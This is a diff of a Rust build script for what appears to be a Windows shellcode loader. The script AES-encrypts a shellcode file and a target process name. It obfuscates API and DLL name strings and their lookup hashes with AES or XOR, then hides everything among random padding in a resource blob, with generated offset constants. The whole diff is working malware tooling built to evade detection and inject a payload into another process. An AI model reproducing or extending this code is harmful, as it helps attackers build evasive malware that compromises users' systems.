@@ -1,10 +1,11 @@
 use windows_sys::core::PCWSTR;
 use windows_sys::Win32::Foundation::GetLastError;
 use windows_sys::Win32::Security::Cryptography::{
-    CryptAcquireContextW, CryptCreateHash, CryptDecrypt, CryptDeriveKey, CryptDestroyHash,
-    CryptDestroyKey, CryptEncrypt, CryptGetKeyParam, CryptHashData, CryptReleaseContext,
-    CryptSetKeyParam, CryptGenKey, ALG_CLASS_DATA_ENCRYPT, ALG_CLASS_HASH, ALG_SID_AES_256, ALG_SID_SHA_256,
-    ALG_TYPE_ANY, ALG_TYPE_BLOCK, CRYPT_VERIFYCONTEXT, KP_BLOCKLEN, KP_IV, PROV_RSA_AES,KP_KEYLEN
+    CryptAcquireContextW, CryptCreateHash, CryptDeriveKey, CryptDestroyHash,
+    CryptDestroyKey, CryptEncrypt, CryptGenKey, CryptGetKeyParam, CryptHashData,
+    CryptReleaseContext, CryptSetKeyParam, ALG_CLASS_DATA_ENCRYPT, ALG_CLASS_HASH, ALG_SID_AES_256,
+    ALG_SID_SHA_256, ALG_TYPE_ANY, ALG_TYPE_BLOCK, CRYPT_VERIFYCONTEXT, KP_BLOCKLEN, KP_IV,
+    KP_KEYLEN, PROV_RSA_AES,
 };
 
 use rand;
@@ -13,19 +14,35 @@ use rand::Rng;
 use std::fs;
 use std::ops::Range;
 use std::path::Path;
+use loader::{hash, hash_case_insensitive};
+
 
 include!("build_config.rs");
 include!("build_util.rs");
 
 type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);
 
-struct StringInfo {
+struct AESString {
     string_name: &'static str,
     encrypted: Vec<u8>,
     offset: usize,
 }
 
-struct XORStringInfo {
+struct XORString {
+    string_name: &'static str,
+    encrypted: Vec<u8>,
+    offset: usize,
+    key: Vec<u8>,
+    key_offset: usize,
+}
+
+struct AESHash {
+    string_name: &'static str,
+    encrypted: Vec<u8>,
+    offset: usize,
+}
+
+struct XORHash {
     string_name: &'static str,
     encrypted: Vec<u8>,
     offset: usize,
@@ -42,8 +59,10 @@ pub struct ResourceGenerator {
     target_offset: usize,
     shellcode: Vec<u8>,
     shellcode_offset: usize,
-    string_info: Vec<StringInfo>,
-    xor_string_info: Vec<XORStringInfo>,
+    aes_strings: Vec<AESString>,
+    xor_strings: Vec<XORString>,
+    aes_hashes: Vec<AESHash>,
+    xor_hashes: Vec<XORHash>,
 }
 
 impl ResourceGenerator {
@@ -51,21 +70,62 @@ impl ResourceGenerator {
         let aes_iv = generate_random_bytes(get_iv_len());
         let aes_key = generate_random_bytes(get_key_len());
 
-        let mut string_info = vec![];
+        let target = aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv);
+
+        let shellcode = aes_encrypt_bytes(
+            fs::read(SHELLCODE_PATH)
+                .expect("Could not unwrap shellcode.")
+                .as_slice(),
+            &aes_key,
+            &aes_iv,
+        );
+
+        let mut aes_strings = vec![];
+        let mut aes_hashes = vec![];
         for string_name in AES_STRINGS {
-            let encrypted = encrypt_bytes(string_name.as_bytes(), &aes_key, &aes_iv);
-            string_info.push(StringInfo {
+            let encrypted = aes_encrypt_bytes(string_name.as_bytes(), &aes_key, &aes_iv);
+            aes_strings.push(AESString {
+                string_name,
+                encrypted,
+                offset: usize::MAX,
+            });
+
+            //also store the hash, if it's needed.
+            let hash = if string_name.ends_with(".dll") {
+                hash_case_insensitive(string_name.as_ptr() as usize, string_name.len())
+            } else {
+                hash(string_name.as_ptr() as usize)
+            };
+            let encrypted = aes_encrypt_bytes(&hash.to_le_bytes(), &aes_key, &aes_iv);
+            aes_hashes.push(AESHash {
                 string_name,
                 encrypted,
                 offset: usize::MAX,
             })
         }
 
-        let mut xor_string_info = vec![];
+        let mut xor_strings = vec![];
+        let mut xor_hashes = vec![];
         for string_name in XOR_STRINGS {
             let key = generate_random_bytes(string_name.len());
             let encrypted = xor_encrypt_bytes(string_name.as_bytes(), &key[..]);
-            xor_string_info.push(XORStringInfo {
+            xor_strings.push(XORString {
+                string_name,
+                encrypted,
+                offset: usize::MAX,
+                key,
+                key_offset: usize::MAX,
+            });
+
+            //also generate the hash, if it's needed
+            let hash = if string_name.ends_with(".dll") {
+                hash_case_insensitive(string_name.as_ptr() as usize, string_name.len()).to_le_bytes()
+            } else {
+                hash(string_name.as_ptr() as usize).to_le_bytes()
+            };
+            let key = generate_random_bytes(hash.len());
+            let encrypted = xor_encrypt_bytes(&hash, key.as_slice());
+            xor_hashes.push(XORHash {
                 string_name,
                 encrypted,
                 offset: usize::MAX,
@@ -74,16 +134,6 @@ impl ResourceGenerator {
             })
         }
 
-        let target = encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv);
-
-        let shellcode = encrypt_bytes(
-            fs::read(SHELLCODE_PATH)
-                .expect("Could not unwrap shellcode.")
-                .as_slice(),
-            &aes_key,
-            &aes_iv,
-        );
-
         ResourceGenerator {
             aes_key,
             aes_key_offset: 0,
@@ -91,21 +141,13 @@ impl ResourceGenerator {
             aes_iv_offset: 0,
             target,
             target_offset: 0,
-            string_info,
-            xor_string_info,
             shellcode,
             shellcode_offset: 0,
+            aes_strings,
+            xor_strings,
+            aes_hashes,
+            xor_hashes,
         }
-    }
-
-    fn add_string_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
-        payload.extend(bytes);
-
-        let mut string_info = self.string_info.pop().expect("No string info to pop!");
-        string_info.offset = payload.len();
-        payload.extend(&string_info.encrypted);
-        self.string_info.insert(0, string_info);
     }
 
     fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
@@ -120,17 +162,34 @@ impl ResourceGenerator {
         let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
         payload.extend(bytes);
 
-        let mut xor_string_info = self.xor_string_info.pop().expect("No string info to pop!");
-        xor_string_info.offset = payload.len();
-        payload.extend(&xor_string_info.encrypted);
+        let mut xor_string = self.xor_strings.pop().expect("No string info to pop!");
+        xor_string.offset = payload.len();
+        payload.extend(&xor_string.encrypted);
 
         //put the key in after
         let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
         payload.extend(bytes);
 
-        xor_string_info.key_offset = payload.len();
-        payload.extend(&xor_string_info.key);
-        self.xor_string_info.insert(0, xor_string_info);
+        xor_string.key_offset = payload.len();
+        payload.extend(&xor_string.key);
+        self.xor_strings.insert(0, xor_string);
+    }
+
+    fn add_xor_hash_to_payload(&mut self, payload: &mut Vec<u8>) {
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        payload.extend(bytes);
+
+        let mut xor_hash = self.xor_hashes.pop().expect("No string info to pop!");
+        xor_hash.offset = payload.len();
+        payload.extend(&xor_hash.encrypted);
+
+        //put the key in after
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
+        payload.extend(bytes);
+
+        xor_hash.key_offset = payload.len();
+        payload.extend(&xor_hash.key);
+        self.xor_hashes.insert(0, xor_hash);
     }
 
     fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
@@ -207,7 +266,7 @@ impl ResourceGenerator {
             self.shellcode.len()
         ));
 
-        for string in &self.string_info {
+        for string in &self.aes_strings {
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
                 string.string_name.to_uppercase().replace(".", "_") + "_POS",
@@ -220,7 +279,20 @@ impl ResourceGenerator {
             ));
         }
 
-        for string in &self.xor_string_info {
+        for string in &self.aes_hashes {
+            consts.push(format!(
+                "pub const {}: usize = {:#X};",
+                string.string_name.to_uppercase().replace(".", "_") + "HASH_POS",
+                string.offset
+            ));
+            consts.push(format!(
+                "pub const {}: usize = {:#X};",
+                string.string_name.to_uppercase().replace(".", "_") + "HASH_LEN",
+                string.encrypted.len()
+            ));
+        }
+
+        for string in &self.xor_strings {
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
                 string.string_name.to_uppercase().replace(".", "_") + "_POS",
@@ -238,11 +310,29 @@ impl ResourceGenerator {
             ));
         }
 
+        for string in &self.xor_hashes {
+            consts.push(format!(
+                "pub const {}: usize = {:#X};",
+                string.string_name.to_uppercase().replace(".", "_") + "HASH_POS",
+                string.offset
+            ));
+            consts.push(format!(
+                "pub const {}: usize = {:#X};",
+                string.string_name.to_uppercase().replace(".", "_") + "HASH_LEN",
+                string.encrypted.len()
+            ));
+            consts.push(format!(
+                "pub const {}: usize = {:#X};",
+                string.string_name.to_uppercase().replace(".", "_") + "HASH_KEY",
+                string.key_offset
+            ));
+        }
+
         fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
     }
 
     fn build_resource_file(&mut self) {
-        self.string_info.shuffle(&mut rand::thread_rng());
+        self.aes_strings.shuffle(&mut rand::thread_rng());
 
         let mut functions: Vec<BuildFn> = vec![
             ResourceGenerator::add_aes_key_to_payload,
@@ -251,15 +341,17 @@ impl ResourceGenerator {
             ResourceGenerator::add_target_to_payload,
         ];
 
-        let mut i = self.string_info.len();
+        let mut i = self.aes_strings.len();
         while i > 0 {
-            functions.push(ResourceGenerator::add_string_to_payload);
+            functions.push(ResourceGenerator::add_aes_string_to_payload);
+            functions.push(ResourceGenerator::add_aes_hash_to_payload);
             i -= 1;
         }
 
-        let mut i = self.xor_string_info.len();
+        let mut i = self.xor_strings.len();
         while i > 0 {
             functions.push(ResourceGenerator::add_xor_string_to_payload);
+            functions.push(ResourceGenerator::add_xor_hash_to_payload);
             i -= 1;
         }
 
